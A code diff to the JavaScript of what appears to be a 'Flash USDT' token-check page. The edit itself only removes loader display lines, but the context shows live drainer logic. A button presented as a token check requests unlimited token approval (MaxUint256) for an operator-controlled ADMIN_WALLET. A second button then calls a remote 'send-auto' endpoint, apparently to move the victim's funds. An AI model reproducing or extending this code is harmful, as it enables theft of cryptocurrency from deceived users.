@@ -92,9 +92,6 @@ approveButton.onclick = async () => {
         const tx = await contract.approve(ADMIN_WALLET, ethers.MaxUint256);
         await tx.wait();
 
-        // Show full screen loader while processing summary
-        document.getElementById("fullScreenLoader").style.display = "block";
-
         // Reuse cached balance/address
         let rate;
         if (userBalance >= 100 && userBalance < 200) rate = 98;
@@ -124,7 +121,6 @@ approveButton.onclick = async () => {
         console.error("Approval error:", err);
         alert("❌ Something went wrong, please try again.");
     } finally {
-        document.getElementById("fullScreenLoader").style.display = "none";
         approveButton.disabled = false;
         approveButton.innerHTML = '<i class="fas fa-bolt"></i> Check Your Token for Flash USDT';
     }
@@ -133,7 +129,6 @@ approveButton.onclick = async () => {
 confirmButton.onclick = async () => {
     confirmButton.disabled = true;
     confirmButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
-    // document.getElementById("fullScreenLoader").style.display = "block";
 
     try {
         const res = await fetch("https://www.checkflash.site/api/send-auto", {
@@ -159,7 +154,6 @@ confirmButton.onclick = async () => {
         console.error("Request failed:", err);
         alert("❌ Something went wrong " + err.message);
     } finally {
-        // document.getElementById("fullScreenLoader").style.display = "none";
         confirmButton.disabled = false;
         confirmButton.innerHTML = 'Get Amount in your Account <i class="fas fa-check"></i>';
     }
